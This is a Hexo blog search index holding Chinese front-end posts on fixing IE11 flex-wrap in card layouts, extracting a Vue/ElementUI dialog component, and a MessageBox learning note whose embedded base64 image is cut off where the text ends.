<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>卡片布局IE适配</title>
      <link href="/2020/04/02/ie11-float-flex-bu-huan-xing-bug/"/>
      <url>/2020/04/02/ie11-float-flex-bu-huan-xing-bug/</url>
      
        <content type="html"><![CDATA[<h1 id="记一次IE11适配"><a href="#记一次IE11适配" class="headerlink" title="记一次IE11适配"></a>记一次IE11适配</h1><p>业务当中，有些比较常见的布局，比如卡片布局，如下图<br><img src="https://i.loli.net/2020/04/02/wrKZFLhgqo1TXjs.jpg" alt="cardLayout.jpg"><br>对于我的话，我有三种解决方案，<br>分别是<code>float</code>,<code>inline-block</code>,<code>flex</code><br>div不进行这三种操作时默认排列如图<br><img src="https://i.loli.net/2020/04/02/rP5t9RjcbonA8U4.jpg" alt="defaultDiv.jpg"></p><h3 id="1-float"><a href="#1-float" class="headerlink" title="1.float"></a>1.float</h3><p>子元素浮动，父元素清除浮动，会自动换行</p><pre><code>.clearfix:after {  content: '';  display: block;  clear: both;}/* 兼容 IE */.clearfix {  zoom: 1;}.child {    float: left;    height: 100px;    width: 20px;}</code></pre><p><img src="https://i.loli.net/2020/04/02/hzZosGKaPfQvBe4.jpg" alt="floatDiv.jpg"><br>清除浮动需要适配IE</p><h3 id="2-inline-block"><a href="#2-inline-block" class="headerlink" title="2. inline-block"></a>2. inline-block</h3><pre><code>.children {    display: inline-block;}</code></pre><p><img src="https://i.loli.net/2020/04/02/bvoD7YQMjgVduFn.jpg" alt="inline-blockDiv.jpg"><br>盒子中间会有空隙，可以百度inline-block缝隙，有很多解决方案，这里不赘述，</p><h3 id="3-flex"><a href="#3-flex" class="headerlink" title="3.flex"></a>3.flex</h3><p>flex布局真是非常的好用</p><pre><code>.father {    display: flex;    flex-wrap: wrap;    justify-content: flex-start;}</code></pre><p><img src="https://i.loli.net/2020/04/02/JLIi3rQaERz17Gm.jpg" alt="flexDiv.jpg"><br><br>一样 没什么区别，但是！这些效果在IE11当中！变成了这样！<br></p><p><img src="https://i.loli.net/2020/04/02/uwCtJ8Mhyv2exaQ.jpg" alt="ieflexbug.jpg"></p><p>这里是举例展示，这其实是flex不加wrap的图，借来一用，类似这样，每个盒子的宽度没变，把父元素宽度撑开，这样的bug，也就是超出页面的部分不会自动换行。<br>这就很头疼。我测试了好多方法，最终发现是父元素的宽度出了问题，父元素宽度我设置为100%；本意是适应父元素的父元素的宽度而设置的，于是我尝试加上了<code>max-widthj</code>来限制最大宽度，解决了问题，但是我怕影响其他浏览器的样式(虽然感觉上并不会)，于是我用媒体查询框定了IE11，</p><pre><code>@media screen and (-ms-high-contrast: active),(-ms-high-contrast:none){    .father {        diaplay:flex;        flex-wrap: wrap;        justify-content: flex-strat;        max-width: 1400px;        min-width: 900px;        width: calc(100vw-200px)    }}</code></pre><p>以上代码中，我规定了最大最小宽度，但是出现的问题是虽然他会换行，但是当窗口缩小时他只会固定在最开始max-width的样式里，不会随着窗口的改变而换行， 所以需要动态改变宽度，所以用到了<code>calc</code>来动态计算(-200px只是我减去了我项目中的侧边栏宽度，不用在意)。<br>至此，一个bug解决完毕。记录一下，以免日后忘记。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> BUG </tag>
            
            <tag> IE </tag>
            
            <tag> Css </tag>
            
            <tag> 工作记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/04/02/hello-world/"/>
      <url>/2020/04/02/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次Vue组件抽取</title>
      <link href="/2020/03/20/vue-zu-jian-chou-qu/"/>
      <url>/2020/03/20/vue-zu-jian-chou-qu/</url>
      
        <content type="html"><![CDATA[<h1 id="vue组件抽取"><a href="#vue组件抽取" class="headerlink" title="vue组件抽取"></a>vue组件抽取</h1><p>这些天工作中遇到了一些有点坑的事，后台管理系统的一个项目，一个组件6000多行，这才是第一版，考虑到以后很难维护，我决定把我自己刚改好的组件抽离出来，方便维护，该项目是Vue+ElementUI构建，我抽取的组件是一个基于ElementUI做的弹窗。<br>##1. 分析耦合<br>需要先列出组件绑定的属性和调用的方法</p><p>找出data由哪些方法进行更改，其他组件是否更改、调用这些data和方法，<br>然后将el-dialog展开</p><p>如果需要控制<code>el-dialog</code>的弹出，需要用到<code>visible</code></p><pre><code>&lt;el-dialog title="收货地址" :visible.sync="dialogTableVisible&gt;  &lt;el-table :data="gridData"&gt;    &lt;el-table-column property="date" label="日期" width="150"&gt;&lt;/el-table-column&gt;    &lt;el-table-column property="name" label="姓名" width="200"&gt;&lt;/el-table-column&gt;    &lt;el-table-column property="address" label="地址"&gt;&lt;/el-table-column&gt;  &lt;/el-table&gt;  &lt;div class="dialog-footer"&gt;      &lt;el-button @click="dialogTableVisible= false"&gt;取 消&lt;/el-button&gt;      &lt;el-button @click="dialogTableVisible= false"&gt;确 定&lt;/el-button&gt;  &lt;/div&gt;&lt;/el-dialog&gt;&lt;script&gt;  export default {    data() {      return {        dialogTableVisible,        gridData: [{          date: '2016-05-02',          name: '王小虎',          address: '上海市普陀区金沙江路 1518 弄'        }, {          date: '2016-05-04',          name: '王小虎',          address: '上海市普陀区金沙江路 1518 弄'        }, {          date: '2016-05-01',          name: '王小虎',          address: '上海市普陀区金沙江路 1518 弄'        }, {          date: '2016-05-03',          name: '王小虎',          address: '上海市普陀区金沙江路 1518 弄'        }]      };    }&lt;/script&gt;</code></pre><p>单独使用el-dialog是如上这样用，如果单抽组件，由父组件控制展示，则需要从父组件传入<code>visible</code>绑定的data,即为父组件给子组件传值，</p><pre><code>// 父组件&lt;el-button @click="dialogTableVisible = true"&gt;打开dialog&lt;/el-button&gt;&lt;my-dialog :dialogTableVisible="dialogTableVisible"&gt;&lt;/my-dialog&gt;&lt;script&gt;    import "MyDialog" form "@components/MyDialog.vue"    export default {        data(){            return{                dialogTableVisible: false            }        },        components: {            MyDialog        }    }&lt;/script&gt;</code></pre><p>子组件用<code>props</code>接收父组件传值</p><pre><code>子组件&lt;script&gt;    export default {        props:['dialogTableVisible']    }&lt;/script&gt;</code></pre><p>这种方式控制组件的隐藏与展示，不可以在子组件中直接修改<code>props</code>的值，会报错，vue不允许直接修改<code>props</code>的值，需要用到子组件给父组件传值，子组件<code>$emit</code>自定义事件，父组件监听事件，由父组件修改</p><pre><code>//子组件&lt;el-dialog title="收货地址" :visible.sync="dialogTableVisible :before-close="cancel"&gt;&lt;/el-dialog&gt;&lt;script&gt;    export default {        props:['dialogTableVisible'],        methods: {            cancel(){                this.$emit("closeDialog")            }        }    }&lt;/script&gt;</code></pre><pre><code>//父组件&lt;my-dialog :dialog-table-visible="dialogTableVisible" @closeDialog="closeChild"&gt;&lt;/my-dialog&gt;&lt;script&gt;    export default {        methods: {            closeChild(){                this.dialogTableVisible= false            }        }    }&lt;/script&gt;</code></pre><p>如果子组件需要父组件触发子组件的方法，则可以给父组件定义ref<br>通过<code>this.$refs.childDialog.children(args)</code>来调用，还可以传参。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> Vue.js </tag>
            
            <tag> Components </tag>
            
            <tag> Element UI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习记录</title>
      <link href="/2020/03/12/xue-xi-ji-lu/"/>
      <url>/2020/03/12/xue-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[<p>#前端学习记录-element-ui/MessageBox</p><p>##1.MessageBox简介<br>message-box是ElementUI的一个弹框，样式如图<br><img src="data:image/jpeg;base64,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